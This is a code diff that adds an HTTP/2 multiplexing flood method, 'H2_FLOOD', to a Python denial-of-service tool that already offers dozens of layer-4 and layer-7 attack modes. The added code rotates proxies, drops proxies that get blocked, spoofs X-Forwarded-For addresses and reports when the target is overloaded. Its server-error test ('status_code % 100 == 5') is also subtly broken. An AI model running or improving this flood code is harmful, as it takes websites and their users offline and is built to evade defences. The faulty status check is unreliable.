@@ -16,6 +16,7 @@ from socket import (AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, S
                     gethostname, socket)
 from ssl import CERT_NONE, SSLContext, create_default_context
 import ssl
+import httpx
 from struct import pack as data_pack
 from subprocess import run, PIPE
 from sys import argv
@@ -144,7 +145,7 @@ class Methods:
     LAYER7_METHODS: Set[str] = {
         "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "SLOW_V2", "HEAD",
         "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
-        "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR", "RHEX", "STOMP", "WP_SEARCH", "XMLRPC_AMP", "POST_DYN"
+        "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR", "RHEX", "STOMP", "WP_SEARCH", "XMLRPC_AMP", "POST_DYN", "H2_FLOOD"
     }
 
     LAYER4_AMP: Set[str] = {
@@ -926,6 +927,7 @@ class HttpFlood(Thread):
             "SLOW_V2": self.SLOW_V2,
             "XMLRPC_AMP": self.XMLRPC_AMP,
             "POST_DYN": self.POST_DYN,
+            "H2_FLOOD": self.H2_FLOOD,
         }
 
         if not referers:
@@ -1476,6 +1478,49 @@ class HttpFlood(Thread):
         except:
             pass
         Tools.safe_close(s)
+
+    def H2_FLOOD(self):
+        # [PHASE 5] HTTP/2 Multiplexing Flood (Peak Evolution)
+        path = self.get_random_target_path()
+        ua = randchoice(self._useragents)
+        
+        # Map raw proxy to httpx format
+        proxy_url = None
+        if self._proxies:
+            if not hasattr(self, '_proxy_cycle'):
+                from itertools import cycle
+                self._proxy_cycle = cycle(self._proxies)
+            p = next(self._proxy_cycle)
+            proxy_url = f"http://{p.proxy}" # Assuming HTTP proxy for now
+            if p.proxy in BURNED_PROXIES: return
+
+        headers = {
+            "User-Agent": ua,
+            "Accept-Encoding": "gzip, deflate, br",
+            "X-Forwarded-For": Tools.get_random_indo_ip(),
+            "Referer": randchoice(self.crawled_paths) if self.crawled_paths else randchoice(self._referers)
+        }
+
+        try:
+            with httpx.Client(
+                http2=True,
+                verify=False,
+                proxies=proxy_url,
+                headers=headers,
+                timeout=3.0
+            ) as client:
+                # HTTP/2 allows multiple concurrent requests on 1 connection
+                for _ in range(self._rpc * 5):
+                    resp = client.get(f"{self._target.scheme}://{self._target.authority}{path}")
+                    global CONNECTIONS_SENT
+                    CONNECTIONS_SENT += 1
+                    if resp.status_code % 100 == 5:
+                        print(f"[{int(CONNECTIONS_SENT)}] [STATUS {resp.status_code}] H2_FLOOD: Target Overloaded!")
+                    elif resp.status_code in {403, 429}:
+                        BURNED_PROXIES.add(proxy_url.replace("http://", ""))
+                        raise Exception("Proxy Blocked")
+        except:
+            pass
 
     def DOWNLOADER(self):
         payload: Any = self.generate_payload()
